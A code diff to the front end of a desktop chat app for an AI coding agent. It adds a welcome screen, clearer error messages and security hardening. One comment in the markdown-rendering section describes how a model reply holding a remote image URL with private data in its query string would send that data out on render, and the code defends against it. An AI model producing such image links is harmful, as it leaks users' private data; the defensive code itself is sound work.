@@ -36,7 +36,7 @@ const strip = (s) => String(s ?? "").replace(/\x1b\[[0-9;?]*[ -\/]*[@-~]/g, "").
 const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]);
 const textOf = (c) => (typeof c === "string" ? c : Array.isArray(c) ? c.filter((b) => b.type === "text").map((b) => b.text).join("\n") : "");
 
-const S = { ownFiles: new Set(), activeChat: {}, threads: {}, info: {}, showAll: new Set(), chars: [], byId: {}, active: null, user: "", home: "", per: {}, panelOpen: false, panelTab: null, openFolds: new Set(), search: "" };
+const S = { activeChat: {}, threads: {}, info: {}, showAll: new Set(), chars: [], byId: {}, active: null, user: "", home: "", per: {}, panelOpen: false, panelTab: null, openFolds: new Set(), search: "" };
 // Chats run side by side (one Pi process each, like Codex). S.per[key] is one chat; each character
 // remembers its active chat in S.activeChat[harness]; the sidebar list lives in S.threads[harness].
 let chatSeq = 0;
@@ -64,9 +64,19 @@ const C = (id = S.active) => S.byId[id];
 
 // ---------- markdown ----------
 marked.use({ gfm: true, breaks: false });
+// Model output is untrusted. No styles or forms (they could restyle or spoof the app), and no remote images:
+// a reply like ![](https://site/?q=<something private>) would send data out the moment it renders. The CSP
+// blocks those loads too; here they become a link you can choose to open.
+const PURIFY = { FORBID_TAGS: ["style", "form", "input", "button", "textarea", "select", "option"], FORBID_ATTR: ["style"] };
 function md(text) {
   const el = h("div", { class: "md" });
-  el.innerHTML = DOMPurify.sanitize(marked.parse(text || ""));
+  el.innerHTML = DOMPurify.sanitize(marked.parse(text || ""), PURIFY);
+  for (const img of el.querySelectorAll("img")) {
+    const src = img.getAttribute("src") || "";
+    if (!/^(https?:)?\/\//i.test(src)) continue;
+    let host = src; try { host = new URL(src, "https://x").host; } catch {}
+    img.replaceWith(h("a", { href: src, class: "remote-img", title: src }, `Image from ${host}`));
+  }
   for (const code of el.querySelectorAll("pre code")) {
     if (window.hljs && code.textContent.length < 20000) { try { hljs.highlightElement(code); } catch {} }
   }
@@ -145,6 +155,7 @@ async function boot() {
   S.cfg = await desk.config();
   S.usage = await desk.usage();
   for (const c of S.chars) { c.accent ||= hue(c.id); S.byId[c.id] = c; }
+  if (!S.chars.length) return renderWelcome();
   desk.onEvent(({ id, ev }) => { if (S.per[id]) onEvent(id, ev); });
   desk.onExit(({ id, code, closed, stderr }) => {
     const p = S.per[id]; if (!p) return;
@@ -163,6 +174,33 @@ async function boot() {
   await loadTasks();
   const start = S.byId[init.startCharacter] || S.byId[localStorage.lastChar] || S.byId[init.defaultCharacter] || S.chars[0];
   await selectCharacter(start.id);
+}
+
+// ---------- first run: no characters yet ----------
+// Shown instead of the chat when the harness folder has no pi-* scripts, so a fresh install says what to do next.
+async function renderWelcome() {
+  document.body.classList.add("welcome");
+  const st = await desk.setupStatus();
+  const code = (t) => h("code", { class: "cmd", title: "Click to copy", onclick: (e) => copyText(t, e.currentTarget) }, t);
+  const step = (ok, title, ...body) => h("li", { class: ok ? "ok" : "" }, h("span", { class: "tick" }, ok ? "✓" : ""), h("div", {}, h("b", {}, title), h("div", { class: "sub" }, ...body)));
+  const addBtn = h("button", { class: "btn primary", onclick: async () => {
+    addBtn.disabled = true;
+    const r = await desk.setupAddExamples();
+    if (r.error) { addBtn.disabled = false; return toast(r.error, "error"); }
+    toast(`Added ${r.added.filter((x) => !x.kept).length} example characters to ${st.harnessDir}`);
+    desk.setupReload();
+  } }, "Add the example characters");
+  $("#hero").replaceChildren(h("div", { class: "welcome-card" },
+    h("h1", {}, "Welcome to Pi Desktop"),
+    h("p", { class: "sub" }, `Every pi-<name> script in ${st.harnessDir} becomes a character with its own face and chats. There are none yet.`),
+    h("ol", { class: "steps" },
+      step(!!st.pi, st.pi ? "Pi is installed" : "Install Pi",
+        ...(st.pi ? [st.pi] : [code("npm install -g @earendil-works/pi-coding-agent"), " then run ", code("pi"), " once in a terminal and log in to a model provider."])),
+      step(false, "Add characters",
+        "Start with three simple examples (Pi, Scout, Quill), or install the character pack (Andrej, Ilya, History, Ali, Narges) from a terminal: ",
+        code(`cd ${st.repo} && scripts/install-pack.sh all`), ". Your own: ", code("scripts/new-character.sh <id>"), ".")),
+    h("div", { class: "welcome-actions" }, addBtn, h("button", { class: "btn", onclick: () => desk.setupReload() }, "Reload")),
+    h("p", { class: "fh" }, "Harness scripts somewhere else? Set harnessDir in config.json (see README), then Reload.")));
 }
 
 // ---------- sidebar: profile switcher (bottom-left) ----------
@@ -233,8 +271,8 @@ function renderThreads() {
   const nav = $("#threads"); nav.replaceChildren();
   const p = P(), q = S.search.toLowerCase().trim();
   const match = (t) => !q || t.title.toLowerCase().includes(q) || (t.snippet || "").includes(q);
-  const live = TH().filter((t) => !t.archived && !t.unsorted && match(t)), archived = TH().filter((t) => t.archived && !t.unsorted && match(t)), unsorted = TH().filter((t) => t.unsorted && match(t));
-  if (!live.length && !archived.length && !unsorted.length) { nav.append(h("div", { class: "th-empty" }, q ? "No matching chats" : `No chats with ${C().name} yet`)); return; }
+  const live = TH().filter((t) => !t.archived && match(t)), archived = TH().filter((t) => t.archived && match(t));
+  if (!live.length && !archived.length) { nav.append(h("div", { class: "th-empty" }, q ? "No matching chats" : `No chats with ${C().name} yet`)); return; }
   // Chats open in this app that Pi hasn't written to disk yet (new chats) still show up, like Codex.
   const unsaved = chatsOf(S.active).filter((c) => c.msgs.length && !TH().some((t) => t.file === c.sessionFile) && (!q || textOf(c.msgs.find((m) => m.role === "user")?.content).toLowerCase().includes(q)));
   if (unsaved.length) {
@@ -256,10 +294,6 @@ function renderThreads() {
   if (archived.length) {
     nav.append(h("button", { class: "th-group th-toggle", onclick: () => { S.showArchived = !S.showArchived; renderThreads(); } }, `${S.showArchived ? "▾" : "▸"} Archived (${archived.length})`));
     if (S.showArchived) archived.forEach((t) => nav.append(threadRow(t)));
-  }
-  if (unsorted.length) {
-    nav.append(h("button", { class: "th-group th-toggle", onclick: () => { S.showUnsorted = !S.showUnsorted; renderThreads(); } }, `${S.showUnsorted || q ? "▾" : "▸"} Unsorted (${unsorted.length})`));
-    if (S.showUnsorted || q) unsorted.forEach((t) => nav.append(threadRow(t)));
   }
 }
 function threadRow(t) {
@@ -418,7 +452,6 @@ async function startChat(key, sessionFile) {
   if (!sessionFile && p.model) { info.model = p.model; info.thinking = p.thinking; } // a fresh chat shows the harness default
   if (key === CK()) renderDock();
 }
-const startHarness = (harness) => live(CK(harness));
 
 // Point a chat at another process key (two chats on one session file share one Pi process).
 function rekeyChat(oldKey, newKey) {
@@ -433,7 +466,6 @@ async function syncState(key) {
   if (!r.success) return;
   const d = r.data;
   p.model = d.model; p.thinking = d.thinkingLevel; p.sessionFile = d.sessionFile; p.sessionName = d.sessionName || "";
-  if (d.sessionFile) S.ownFiles.add(d.sessionFile);
   if (key === CK()) { renderDock(); renderCrumb(); renderThreads(); }
 }
 
@@ -777,8 +809,8 @@ function renderCtx() {
 // Turns the provider's raw error into what happened and what to do. The original text stays in the tooltip.
 function friendlyError(raw) {
   const e = String(raw);
-  if (/subscription is required|subscription_sharing|Go models/i.test(e)) return "This model's subscription isn't active (OpenCode Go), so it can't answer. Renew it, or switch this chat to another model with the model picker. " + "Nothing was lost; send your message again after switching.";
-  if (/session limit|five_hour|rate limit/i.test(e) && /resets/i.test(e)) { const at = e.match(/resets\s+(\d{1,2}(?::\d{2})?\s?[ap]m)/i)?.[1]; return `Claude's usage limit is reached${at ? `; it resets at ${at}` : ""}. Switch to another model to keep going, or wait.`; }
+  if (/subscription is required|subscription_sharing|Go models/i.test(e)) return "This model's subscription isn't active, so it can't answer. Renew it, or switch this chat to another model with the model picker. " + "Nothing was lost; send your message again after switching.";
+  if (/session limit|five_hour|rate limit/i.test(e) && /resets/i.test(e)) { const at = e.match(/resets\s+(\d{1,2}(?::\d{2})?\s?[ap]m)/i)?.[1]; return `This model's usage limit is reached${at ? `; it resets at ${at}` : ""}. Switch to another model to keep going, or wait.`; }
   if (/no space left|ENOSPC/i.test(e)) return "Your Mac's disk is full, so this chat couldn't save its work. Free some space, then send your message again.";
   if (/EPROTO|ENOTFOUND|ECONNREFUSED|ECONNRESET|ETIMEDOUT|Unable to connect|Can't reach the API|No response from API|network dropped/i.test(e)) return "The connection dropped and the automatic retries ran out. Check your internet, then send \"continue\" to pick up where it stopped.";
   if (/prompt is too long|context.*(overflow|length|exceed)/i.test(e)) return "This chat has grown too long for the model. Start a new chat, or compact it first (/compact).";
@@ -1128,7 +1160,9 @@ async function toggleVoice() {
     const buf = await new Blob(V.chunks, { type: "audio/webm" }).arrayBuffer();
     const r = await desk.transcribe(new Uint8Array(buf), input.value.slice(0, input.selectionStart ?? input.value.length));
     $("#voiceState").textContent = "";
-    if (r.error) return toast("Transcription failed: " + r.error, "error");
+    if (r.error) return toast(/ENOENT/.test(r.error) ? "Voice typing needs whisper.cpp and ffmpeg: brew install whisper-cpp ffmpeg (npm run doctor checks it)."
+      : /no such file|failed to (open|load) model|model file/i.test(r.error) ? "Voice typing has no model yet. See whisperModel in the README (npm run doctor checks it)."
+      : "Transcription failed: " + r.error, "error");
     if (!r.text) return;
     const s = input.selectionStart ?? input.value.length, before = input.value.slice(0, s), after = input.value.slice(input.selectionEnd ?? s);
     const spacer = before && !/\s$/.test(before) ? " " : "";
@@ -1340,7 +1374,6 @@ function scheduleText(sc = {}) {
   return `Every day at ${sc.time}`;
 }
 async function loadTasks() { S.tasks = await desk.tasks(); }
-desk.onToast(({ msg, type }) => toast(msg, type));
 desk.onTasks((list) => { S.tasks = list; if (S.panelOpen && S.panelTab === "Tasks") renderPanel(); });
 desk.onOpenTask(async ({ character, id }) => { await selectCharacter(character); S.taskOpen = id; openPanel("tasks"); });
 
@@ -1431,8 +1464,8 @@ function renderLesson(body) {
   if (!S.lesson) return body.replaceChildren(h("div", { class: "blank" }, `Lessons open here.\nWhen ${C().name} writes a new lesson, it appears automatically.`));
   body.replaceChildren(
     h("div", { class: "viewer-bar" }, h("span", { class: "nm" }, S.lesson.split("/").slice(-3).join(" / ")),
-      h("button", { onclick: () => renderPanel() }, "Reload"), h("button", { onclick: () => desk.open(S.lesson) }, "Open in browser"), h("button", { onclick: () => desk.reveal(S.lesson) }, "Reveal")),
-    h("iframe", { class: "viewer", sandbox: "allow-scripts allow-popups", src: "file://" + encodeURI(S.lesson) + "?t=" + Date.now() }));
+      h("button", { onclick: () => renderPanel() }, "Reload"), h("button", { onclick: () => openOut(S.lesson) }, "Open in browser"), h("button", { onclick: () => desk.reveal(S.lesson) }, "Reveal")),
+    h("iframe", { class: "viewer", sandbox: "allow-scripts", src: "file://" + encodeURI(S.lesson) + "?t=" + Date.now() }));
 }
 async function renderProfile(body) {
   const root = (C().learningRoot || "~/learning").replace(/^~/, S.home);
@@ -1458,10 +1491,14 @@ function openFile(p) {
   if (C().panel === "learning" && /\/(lessons|reference)\/[^/]+\.html$/.test(p)) { openPanel("lesson"); return showLesson(p); }
   S.filePreview = p; openPanel("files");
 }
+const openOut = async (p) => { const r = await desk.open(p); if (r) toast(r, "warning"); };
 async function renderPreview(body) {
   const p = S.filePreview, ext = (p.split(".").pop() || "").toLowerCase();
+  // Same rule as every other file read: home folder or /tmp, never credential stores (safePath in main.js).
+  if (!(await desk.allowed(p))) return body.replaceChildren(h("div", { class: "viewer-bar" }, h("button", { onclick: () => { S.filePreview = null; renderPanel(); } }, "← Files")),
+    h("div", { class: "viewer-text" }, h("div", { class: "blank" }, "That file is outside what Pi Desktop may open (your home folder or /tmp, never keys or credentials).")));
   const bar = h("div", { class: "viewer-bar" }, h("button", { onclick: () => { S.filePreview = null; renderPanel(); } }, "← Files"), h("span", { class: "nm" }, p.replace(S.home, "~")),
-    h("button", { onclick: () => desk.open(p) }, "Open"), h("button", { onclick: () => desk.reveal(p) }, "Reveal"));
+    h("button", { onclick: () => openOut(p) }, "Open"), h("button", { onclick: () => desk.reveal(p) }, "Reveal"));
   let view;
   if (ext === "html" || ext === "htm" || ext === "pdf") view = h("iframe", { class: "viewer", sandbox: ext === "pdf" ? null : "allow-scripts", src: "file://" + encodeURI(p) });
   else if (/^(png|jpe?g|gif|webp|svg)$/.test(ext)) view = h("div", { class: "viewer-text" }, h("img", { src: "file://" + encodeURI(p), style: "max-width:100%;border-radius:10px" }));
@@ -1582,10 +1619,12 @@ async function openSettings() {
       h("div", { class: "row" }, h("button", { class: "btn", onclick: close }, "Cancel"), h("button", { class: "btn primary", onclick: save }, "Save")));
   });
 }
+// An Electron accelerator ("Alt+Shift+Space") as the Mac shows it ("⌥⇧Space").
+const keyLabel = (acc) => acc.split("+").map((k) => ({ alt: "⌥", option: "⌥", shift: "⇧", cmd: "⌘", command: "⌘", commandorcontrol: "⌘", cmdorctrl: "⌘", ctrl: "⌃", control: "⌃" })[k.toLowerCase()] || k).join("");
 function openShortcuts() {
   const rows = [["⌘N", "New chat"], ["⌘K", "Switch character"], ["⌘1 – ⌘9", "Jump to character"], ["⌘B", "Toggle sidebar"], ["⌘\\", "Toggle side panel"],
     ["⌘⇧D", "Voice typing"], ["⌘⇧E", "Export chat as HTML"], ["⌘,", "Settings"], ["Enter", "Send (while replying: steer)"], ["⇧Enter", "New line"],
-    ["Esc", "Stop the reply"], ["/", "Slash commands"], ["⌥⇧Space", "Show / hide app (anywhere)"]];
+    ["Esc", "Stop the reply"], ["/", "Slash commands"], [keyLabel(S.cfg?.hotkey || "Alt+Shift+Space"), "Show / hide app (anywhere)"]];
   sheet((box, close) => box.append(h("div", { class: "title" }, "Keyboard shortcuts"),
     h("div", { class: "keys" }, rows.map(([k, d]) => h("div", { class: "krow" }, h("kbd", {}, k), h("span", {}, d)))),
     h("div", { class: "row" }, h("button", { class: "btn primary", onclick: close }, "Done"))));
@@ -1633,7 +1672,12 @@ function renderCrash() {
   const p = P(), box = $("#crash");
   box.hidden = !p.crashed;
   if (!p.crashed) return;
-  box.replaceChildren(h("span", {}, `${C().name}'s Pi process stopped (exit ${p.crashed.code}).`),
+  // The two first-run failures get a plain answer: pi not on the PATH, or the harness script itself missing/not executable.
+  const err = p.crashed.stderr || "";
+  const why = /\bpi: (command )?not found|exec: pi: not found/.test(err) ? "Pi isn't installed (or isn't on your PATH). Run: npm install -g @earendil-works/pi-coding-agent, then Restart."
+    : /ENOENT|EACCES|permission denied|No such file/i.test(err) && p.crashed.code === 127 ? `The harness script for ${C().name} is missing or not executable (chmod +x it), then Restart.`
+    : `${C().name}'s Pi process stopped (exit ${p.crashed.code}).`;
+  box.replaceChildren(h("span", {}, why),
     p.crashed.stderr ? h("button", { class: "link", onclick: () => toast(p.crashed.stderr, "error") }, "Details") : null,
     h("button", { class: "btn primary", onclick: async () => {
       const file = p.sessionFile; p.crashed = null; renderCrash();
@@ -1643,7 +1687,7 @@ function renderCrash() {
 }
 
 // ---------- native menu ----------
-desk.onMenu((what) => ({
+desk.onMenu((what) => S.active && ({
   "new-chat": newChat, switcher: () => switcher($("#sideFoot .profile")), export: () => exportThread(null),
   "toggle-sidebar": () => toggleSidebar(), "toggle-panel": togglePanel, settings: openSettings, shortcuts: openShortcuts,
 })[what]?.());
